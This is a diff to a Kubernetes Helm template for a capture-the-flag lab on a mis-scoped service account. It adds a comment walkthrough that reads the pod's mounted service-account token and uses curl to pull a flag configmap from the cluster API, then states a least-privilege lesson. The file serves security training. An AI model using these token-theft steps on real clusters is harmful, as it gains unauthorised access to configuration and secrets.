@@ -1,4 +1,62 @@
-{{- $ns := include "player.ns" . -}}
+# =============================================================================
+# CHALLENGE 02: Mis-scoped Service Account
+# =============================================================================
+#
+# OBJECTIVE:
+# Exploit an overly permissive service account to access a configmap containing
+# the flag using the mounted service account token.
+#
+# SCENARIO:
+# A pod is running with a service account that has been granted access to
+# specific configmaps. The service account token is automatically mounted
+# in the pod, allowing you to make authenticated API calls to retrieve
+# the flag from a configmap.
+#
+# HOW TO SOLVE:
+# 1. Access the pod with the misconfigured service account:
+#    kubectl exec -it deployment/sa-pwn -- /bin/sh
+#
+# 2. Examine the mounted service account token location:
+#    ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+#    cat /var/run/secrets/kubernetes.io/serviceaccount/token
+#
+# 3. Get your namespace:
+#    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+#
+# 4. Get the service account token:
+#    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+#
+# 5. Use the token to list configmaps via the Kubernetes API:
+#    curl -H "Authorization: Bearer $TOKEN" \
+#         -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces/$NAMESPACE/configmaps
+#
+# 6. Retrieve the specific configmap containing the flag:
+#    curl -H "Authorization: Bearer $TOKEN" \
+#         -k https://kubernetes.default.svc.cluster.local/api/v1/namespaces/$NAMESPACE/configmaps/flag-mis-sa
+#
+# 7. Extract the flag from the JSON response.
+#
+# ALTERNATIVE APPROACHES:
+# - Use kubectl within the pod (if available): 
+#   kubectl get configmap flag-mis-sa -o yaml
+# - Try listing all configmaps first: kubectl get configmaps
+# - Check what permissions you have: kubectl auth can-i --list
+#
+# KEY CONCEPTS:
+# - Kubernetes service accounts and RBAC
+# - Automatic service account token mounting
+# - Kubernetes API authentication with bearer tokens
+# - ConfigMap access and security
+# - Principle of least privilege violations
+#
+# SECURITY LESSON:
+# Service accounts should only have the minimum permissions required for their
+# function. Overly broad access to configmaps can expose sensitive configuration
+# data and secrets.
+#
+# =============================================================================
+
+{{- $ns := include "player.ns" . }}
 
 apiVersion: v1
 kind: ServiceAccount
